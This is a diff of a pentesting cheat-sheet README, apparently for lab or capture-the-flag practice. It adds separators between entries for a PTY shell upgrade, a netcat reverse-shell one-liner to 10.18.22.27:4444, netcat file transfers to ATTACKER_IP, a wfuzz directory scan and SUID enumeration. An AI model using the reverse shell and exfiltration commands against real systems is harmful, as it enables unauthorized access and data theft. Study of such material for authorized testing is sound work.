@@ -10,21 +10,25 @@ In this repository, you will find a compilation of various tricks, commands, and
 ## Tricks
 Here are some handy tricks to enhance your pentesting workflow:
 
+---
 #### Spawn a fully interactive shell:
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
+---
 #### Reverse shell using Netcat:
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
 ```
 
+---
 #### Set appropriate permissions for `id_rsa` file before usage:
 ```
 chmod 600 id_rsa
 ```
 
+---
 #### File Transfer on Netcat
 
 1. To download a file on the remote shell:
@@ -36,36 +40,45 @@ nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
 nc -l ATTACKER_PORT > [output_file_path]
 ```
 
+---
 #### Web
 Discover hidden directories using `wfuzz`:
 ```
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
 ```
+---
 ####  Encoding techniques:
 - [splitbrain](https://www.splitbrain.org/_static/ook/)
 - [hashes](https://hashes.com/en/tools/hash_identifier)
 - [md5hashing](https://md5hashing.net/hash)
 - [cyberchef](https://gchq.github.io/CyberChef/)
 
+---------------------------------
 ## Additional Notes
 Here are some additional notes that might come in handy during your penetration testing journey:
+
+---
 
 #### Read a raw file using `xxd`:
 ```
 xxd -r file.raw > output.txt
 ```
+---
 #### terminal hack
 `l\s`: Equivalent to `ls`
 
+---
 #### Transfer files using `scp`:
 ```
 scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ```
+---
 #### Decompress a gzip file:
 ```
 gzip -d file.gz
 ```
 
+---
 #### Privilege Escalation:
 Identify SUID/SGID files:
 ```
